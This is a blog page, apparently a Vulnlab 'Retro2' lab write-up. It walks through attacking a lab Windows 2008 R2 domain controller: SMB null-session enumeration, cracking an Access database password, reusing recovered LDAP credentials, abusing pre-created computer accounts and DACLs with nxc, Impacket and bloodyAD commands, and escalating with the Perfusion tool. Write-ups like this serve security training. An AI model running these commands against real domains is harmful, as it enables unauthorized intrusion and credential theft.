@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en-us" data-theme="light">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>
+  Vulnlab : Retro2 Easy - l0key blog
+</title>
+
+
+
+<meta name="description" content="In this lab, we will use pre-created computer accounts, abuse DACLs, and exploit an unpatched vulnerability to elevate our privileges.
+Reconnaissance
+Nmap scan …" />
+
+
+
+<meta
+  property="og:title"
+  content="Vulnlab : Retro2 Easy"
+/>
+<meta
+  property="og:description"
+  content="In this lab, we will use pre-created computer accounts, abuse DACLs, and exploit an unpatched vulnerability to elevate our privileges.
+Reconnaissance
+Nmap scan …"
+/>
+<meta
+  property="og:type"
+  content="article"
+/>
+<meta property="og:url" content="http://localhost:1313/posts/retro2/" />
+<meta property="og:site_name" content="l0key blog" />
+
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta
+  name="twitter:title"
+  content="Vulnlab : Retro2 Easy"
+/>
+<meta
+  name="twitter:description"
+  content="In this lab, we will use pre-created computer accounts, abuse DACLs, and exploit an unpatched vulnerability to elevate our privileges.
+Reconnaissance
+Nmap scan …"
+/>
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@400;500&display=swap"
+  rel="stylesheet"
+/>
+
+
+<link
+  rel="stylesheet"
+  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+/>
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/style.css">
+<link rel="stylesheet" href="/css/custom.css">
+<script src="/js/image-zoom.js"></script>
+
+
+
+</head>
+<body>
+    
+    <div class="reading-progress"></div>
+    
+
+    
+
+    <main>
+        
+
+<div class="post-overlay active">
+    <div class="post-overlay-backdrop"></div>
+    <div class="post-overlay-content" style="position: relative; min-height: 100vh; padding: 0; transform: translateY(0);">
+        <div class="post-overlay-header">
+            <div class="post-overlay-title">
+                <a href="/" class="overlay-site-title">l0key blog</a>
+            </div>
+            <button class="post-overlay-close" aria-label="Close post" onclick="window.location.href='/'">
+                <i class="fas fa-times"></i>
+            </button>
+        </div>
+        <div class="post-layout">
+        <article class="post-content">
+            <header class="post-header">
+                <div class="post-meta">
+                    <span class="post-date">2025.10.16</span>
+                    <div class="reading-time-post">
+                        <span class="coffee-cups">
+                            
+                            
+                            
+                            
+                                
+                            
+                            
+                                
+                            
+                                
+                            
+                                
+                            
+                                
+                            
+                                
+                            
+                            ☕☕☕☕☕
+                        </span>
+                        <span>7 min read</span>
+                    </div>
+                </div>
+                <h1 class="post-title">Vulnlab : Retro2 Easy</h1>
+                
+
+                
+                <div class="post-tags-header">
+                    
+                    <a href="http://localhost:1313/tags/misc" class="post-tag">misc</a>
+                    
+                </div>
+                
+            </header>
+            <div class="post-body">
+                <p>In this lab, we will use pre-created computer accounts, abuse DACLs, and exploit an unpatched vulnerability to elevate our privileges.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.90.89
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.025s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">984</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE            VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain             Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15F75<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec       Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-10-15 16:00:43Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap               Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: retro2.vl, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds       Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 - <span style="color:#ae81ff">2012</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: RETRO2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: retro2.vl, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>3389/tcp  open  ssl/ms-wbt-server?
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49158/tcp open  msrpc              Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</span></span></code></pre></div><p>Ok, we are dealing with an Active Directory using a domain controller running Windows Server 2008 R2. I think there must already be CVEs for this version allowing us to quickly pwn the lab, but that&rsquo;s probably not the intended path.</p>
+<p>So we will first enumerate the SMB shares.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 15, <span style="color:#ae81ff">2025</span> - 18:07:43 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb $IP -u &#39;&#39; -p &#39;&#39; --shares </span>
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:BLN01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro2.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro2.vl<span style="color:#ae81ff">\:</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 15, <span style="color:#ae81ff">2025</span> - 18:07:49 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb $IP -u &#39;test&#39; -p &#39;&#39; --shares</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:BLN01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro2.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro2.vl<span style="color:#ae81ff">\t</span>est: <span style="color:#f92672">(</span>Guest<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerated shares
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            Share           Permissions     Remark
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            -----           -----------     ------
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            ADMIN$                          Remote Admin
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            C$                              Default share
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            IPC$                            Remote IPC
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            NETLOGON                        Logon server share
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            Public          READ
+</span></span><span style="display:flex;"><span>SMB         10.10.90.89     <span style="color:#ae81ff">445</span>    BLN01            SYSVOL                          Logon server share
+</span></span></code></pre></div><p>SMB null session is enabled, which allows us to read the Public share. In this share, we have an MS Access file.
+After trying to open it with MS Access, we can see that it is password protected. Fortunately, there is a tool that allows us to extract the hash of this password and then crack it with John.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 15, <span style="color:#ae81ff">2025</span> - 19:00:47 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># python2 office2john.py staff.accdb| tee staff_hash</span>
+</span></span><span style="display:flex;"><span>staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 15, <span style="color:#ae81ff">2025</span> - 19:04:48 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># john staff_hash</span>
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>Office, 2007/2010/2013 <span style="color:#f92672">[</span>SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>MS Office version<span style="color:#f92672">)</span> is <span style="color:#ae81ff">2013</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">100000</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">12</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Proceeding with single, rules:Single
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, <span style="color:#e6db74">&#39;h&#39;</span> <span style="color:#66d9ef">for</span> help, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>Almost <span style="color:#66d9ef">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#66d9ef">if</span> any.
+</span></span><span style="display:flex;"><span>0g 0:00:01:13 DONE 1/3 <span style="color:#f92672">(</span>2025-10-15 19:06<span style="color:#f92672">)</span> 0g/s 192.0p/s 192.0c/s 192.0C/s Sstaff.accdb1902..Astaff1900
+</span></span><span style="display:flex;"><span>Proceeding with wordlist:/opt/tools/john/run/password.lst
+</span></span><span style="display:flex;"><span>Enabling duplicate candidate password suppressor
+</span></span><span style="display:flex;"><span>class08          <span style="color:#f92672">(</span>staff.accdb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>1g 0:00:02:05 DONE 2/3 <span style="color:#f92672">(</span>2025-10-15 19:07<span style="color:#f92672">)</span> 0.007968g/s 195.6p/s 195.6c/s 195.6C/s coolkid..love27
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> strLDAP <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;LDAP://OU=staff,DC=retro2,DC=vl&#34;</span>
+</span></span><span style="display:flex;"><span>    strUser <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;retro2\ldapreader&#34;</span>
+</span></span><span style="display:flex;"><span>    strPassword <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ppYaVcB5R&#34;</span>
+</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
+<p>We now have credentials for the ldapreader user. We will use this user to find a path to become admin with bloodhound.</p>
+<p><img src="blood_2.png" alt="blood_2"></p>
+<p>We can see that if we can gain access to the FS01$ machine account for example, we can then abuse the GenericWrite ACE to modify the password of the ADMWS01 machine, which will then allow us to abuse AddMember to add the ldapreader user to the SERVICES group, which is a member of the REMOTE DESKTOP USERS group.</p>
+<p>With an LDAP query, we can see that the local groups (built-in AD groups) on the domain controller contain the RDP group, which means that if we control the RDP group, we can connect via RDP to the domain controller.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 15, <span style="color:#ae81ff">2025</span> - 21:39:23 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb $IP -u &#39;ldapreader&#39; -p &#39;ppYaVcB5R&#39; --local-groups</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:BLN01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro2.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> retro2.vl<span style="color:#ae81ff">\l</span>dapreader:ppYaVcB5R
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumerating with SAMRPC protocol
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerated local groups
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">549</span> - Server Operators
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">548</span> - Account Operators
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">554</span> - Pre-Windows <span style="color:#ae81ff">2000</span> Compatible Access
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">557</span> - Incoming Forest Trust Builders
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">560</span> - Windows Authorization Access Group
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">561</span> - Terminal Server License Servers
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">544</span> - Administrators
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">545</span> - Users
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">546</span> - Guests
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">550</span> - Print Operators
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">551</span> - Backup Operators
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">552</span> - Replicator
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">555</span> - Remote Desktop Users
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">556</span> - Network Configuration Operators
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">558</span> - Performance Monitor Users
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">559</span> - Performance Log Users
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">562</span> - Distributed COM Users
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">568</span> - IIS_IUSRS
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">569</span> - Cryptographic Operators
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">573</span> - Event Log Readers
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">574</span> - Certificate Service DCOM Access
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">517</span> - Cert Publishers
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">553</span> - RAS and IAS Servers
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">571</span> - Allowed RODC Password Replication Group
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">572</span> - Denied RODC Password Replication Group
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#ae81ff">1102</span> - DnsAdmins
+</span></span></code></pre></div><p>Let&rsquo;s check if we can control the FS01 computer account, and indeed we can see that it has the pre-created computer attribute, which means its password is the machine name in lowercase.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 15, <span style="color:#ae81ff">2025</span> - 21:43:13 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># nxc smb $IP -u &#39;fs01$&#39; -p &#39;fs01&#39; --shares</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> x64 <span style="color:#f92672">(</span>name:BLN01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:retro2.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.10.109.196   <span style="color:#ae81ff">445</span>    BLN01            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> retro2.vl<span style="color:#ae81ff">\f</span>s01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+</span></span></code></pre></div><p>We cannot use getTGT to obtain a TGT because we are on a 2008 functional level domain. So we will simply change the password of FS01.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 15, <span style="color:#ae81ff">2025</span> - 21:53:36 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># python rpcchangepwd.py retro2.vl/fs01\$:fs01@$IP -newpass Test123!</span>
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Password was changed successfully.
+</span></span></code></pre></div><p>Once that&rsquo;s done, we can now modify the password of the ADMWS01 machine by abusing GenericWrite.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 15, <span style="color:#ae81ff">2025</span> - 22:05:29 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># net rpc password &#39;ADMWS01$&#39; Test123! -U retro2.vl/&#39;fs01$&#39;%Test123! -S $IP</span>
+</span></span></code></pre></div><p>Then by abusing AddMember, we can add the ldapreader user to the SERVICES group.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Oct 15, <span style="color:#ae81ff">2025</span> - 22:06:28 <span style="color:#f92672">(</span>CEST<span style="color:#f92672">)]</span> exegol-vulnlab /workspace <span style="color:#75715e"># bloodyAD --host $IP -d retro2.vl -u &#39;ADMWS01$&#39; -p &#39;Test123!&#39; add groupMember &#39;SERVICES&#39; &#39;ldapreader&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> ldapreader added to SERVICES
+</span></span></code></pre></div><p>Now we can connect via RDP to the domain controller BLN01.</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Once connected via RDP to the domain controller, we can look for privilege escalation. After some research, I found these two blog articles:
+<a href="https://itm4n.github.io/windows-registry-rpceptmapper-eop/">https://itm4n.github.io/windows-registry-rpceptmapper-eop/</a>
+<a href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/#in-the-previous-episode">https://itm4n.github.io/windows-registry-rpceptmapper-exploit/#in-the-previous-episode</a></p>
+<p>We will therefore use the Perfusion tool to become SYSTEM on the domain controller. This tool exploits a vulnerability on Windows 7 and Windows Server 2008 that allows adding a Performance key for the DNSCache and RpcEtMapper services. This key then allows loading a DLL that will execute a cmd in the WMI user context.</p>
+<p>You can compile the tool with Visual Studio 2019.</p>
+<p>Once that&rsquo;s done, we create a small Python server to deliver the tool to the domain controller and then use it.</p>
+<p><img src="retro2_perfusion.png" alt="retro2_perfusion"></p>
+<p><img src="retro2_perf_system.png" alt="retro2_perf_system"></p>
+<p>Boom! Now we can get the flag!</p>
+<p>Thanks for reading!</p>
+
+            </div>
+
+            
+            
+            <div class="related-posts">
+                <h3>Related Content</h3>
+                <div class="related-grid">
+                    
+                    <div class="related-post">
+                        <h4><a href="http://localhost:1313/posts/retro/">Vulnlab : Retro Easy</a></h4>
+                        <div class="related-meta">
+                            2025.10.16 •
+                            
+                            
+                            
+                            
+                            
+                            ☕☕☕☕☕ 10 min read
+                        </div>
+                    </div>
+                    
+                    <div class="related-post">
+                        <h4><a href="http://localhost:1313/posts/baby/vulnlab_baby/">Vulnlab : Baby Easy</a></h4>
+                        <div class="related-meta">
+                            2025.10.12 •
+                            
+                            
+                            
+                            
+                            
+                            ☕☕☕☕☕ 6 min read
+                        </div>
+                    </div>
+                    
+                    <div class="related-post">
+                        <h4><a href="http://localhost:1313/about/about/">My First Post</a></h4>
+                        <div class="related-meta">
+                            2025.09.15 •
+                            
+                            
+                            
+                            
+                            
+                             0 min read
+                        </div>
+                    </div>
+                    
+                </div>
+            </div>
+            
+
+            
+            <nav class="post-navigation">
+                
+                <div class="nav-previous">
+                    <span class="nav-label">← Previous</span>
+                    <a href="http://localhost:1313/posts/pors/hackropole_pors/" class="nav-title">Hackropole : PORS</a>
+                </div>
+                
+
+                
+                <div class="nav-next">
+                    <span class="nav-label">Next →</span>
+                    <a href="http://localhost:1313/posts/retro/" class="nav-title">Vulnlab : Retro Easy</a>
+                </div>
+                
+            </nav>
+        </article>
+
+        <aside class="sidebar">
+            <nav class="toc">
+                <h4>Contents</h4>
+                <div id="toc-content">
+                    
+                </div>
+            </nav>
+        </aside>
+        </div>
+    </div>
+</div>
+
+    </main>
+
+    
+
+    <script src="http://localhost:1313/js/main.js"></script>
+</body>
+</html>
